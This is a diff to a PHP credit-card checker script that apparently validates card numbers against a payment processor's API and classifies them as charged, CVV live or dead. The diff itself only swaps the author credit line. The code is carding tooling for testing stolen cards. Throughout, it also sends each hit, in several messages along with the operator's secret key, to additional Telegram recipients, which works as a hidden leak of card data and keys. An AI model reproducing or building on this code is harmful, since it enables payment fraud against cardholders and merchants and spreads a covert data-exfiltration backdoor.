@@ -173,13 +173,13 @@ break;
 //=================== [ RESPONSES ] ===================//
 
 if(strpos($result2, '"seller_message": "Payment complete."' )) {
-    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: $amt $ CCN Charged ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: $amt $ CCN Charged ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️•【↯ CᴏᴅᴇヤCrafters】•</b>");
     send_message($userid2, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: $amt $ CCN Charged ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
     send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: $amt $ CCN Charged ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
-    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' CCN Charged ✅ by 𝙅𝙚𝙩𝙞𝙭  <br>➤  Bin:  '.$brand.' '.$category.' '.$type.'  <br>➤ Bank: '.$bank.'  <br> ➤ Country: '.$country.' '.$emoji.' <br> ➤ Receipt : <a href='.$receipturl.'>Here</a></span><br>';
+    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' CCN Charged ✅ •【↯ CᴏᴅᴇヤCrafters】•  <br>➤  Bin:  '.$brand.' '.$category.' '.$type.'  <br>➤ Bank: '.$bank.'  <br> ➤ Country: '.$country.' '.$emoji.' <br> ➤ Receipt : <a href='.$receipturl.'>Here</a></span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
-    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️•【↯ CᴏᴅᴇヤCrafters】•</b>");
     send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
     send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: CVV LIVE</span><br>';
@@ -215,9 +215,9 @@ elseif(strpos($result2,'"code": "incorrect_cvc"')){
     echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: Security code is incorrect</span><br>';
 }
 elseif(strpos($result1,' "code": "invalid_cvc"')){
-    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CCN ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
-    send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CCN ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
-    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CCN ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CCN ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>•【↯ CᴏᴅᴇヤCrafters】•</b>");
+    send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CCN ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️•【↯ CᴏᴅᴇヤCrafters】•</b>");
+    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CCN ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️•【↯ CᴏᴅᴇヤCrafters】•</b>");
     echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: Security code is incorrect</span><br>';    
 }
 elseif(strpos($result1,"invalid_expiry_month")){
@@ -242,37 +242,37 @@ elseif(strpos($result2, "stolen_card" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: STOLEN CARD</span><br>';
 }
 elseif(strpos($result2, "transaction_not_allowed" )) {
-    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️•【↯ CᴏᴅᴇヤCrafters】•</b>");
     send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
     send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: TRANSACTION NOT ALLOWED</span><br>';
 }
 elseif(strpos($result2, "authentication_required")) {
-    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️•【↯ CᴏᴅᴇヤCrafters】•</b>");
     send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
     send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: 32DS REQUIRED</span><br>';
 } 
 elseif(strpos($result2, "card_error_authentication_required")) {
-    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️•【↯ CᴏᴅᴇヤCrafters】•</b>");
     send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
     send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: 32DS REQUIRED</span><br>';
 } 
 elseif(strpos($result2, "card_error_authentication_required")) {
-    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️•【↯ CᴏᴅᴇヤCrafters】•</b>");
     send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
     send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: 32DS REQUIRED</span><br>';
 } 
 elseif(strpos($result1, "card_error_authentication_required")) {
-    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️•【↯ CᴏᴅᴇヤCrafters】•</b>");
     send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
     send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: 32DS REQUIRED</span><br>';
 } 
 elseif(strpos($result2, "incorrect_cvc" )) {
-    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️•【↯ CᴏᴅᴇヤCrafters】•</b>");
     send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
     send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: Security code is incorrect</span><br>';
@@ -359,9 +359,9 @@ elseif (strpos($result,'Your card does not support this type of purchase.')) {
     echo 'DEAD</span> CC:  '.$lista.'</span>  <br>➤ Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
-    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
-    send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
-    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️•【↯ CᴏᴅᴇヤCrafters】•</b>");
+    send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️•【↯ CᴏᴅᴇヤCrafters】•</b>");
+    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️•【↯ CᴏᴅᴇヤCrafters】•</b>");
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: CVV LIVE</span><br>';
 }
 elseif(strpos($result2, "fraudulent" )) {
